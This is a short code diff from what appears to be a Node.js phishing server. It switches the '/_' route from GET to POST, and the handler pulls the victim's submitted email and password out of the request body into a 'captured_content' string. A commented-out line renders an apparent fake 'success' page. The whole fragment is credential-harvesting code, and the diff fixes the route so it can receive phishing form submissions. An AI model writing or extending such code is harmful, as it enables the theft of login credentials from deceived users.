@@ -26,7 +26,7 @@ app.get('/', function (req, res) {
     
 });
 
-app.get('/_', function (req, res) {
+app.post('/_', function (req, res) {
    // res.render('f_success');
     var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`;
     
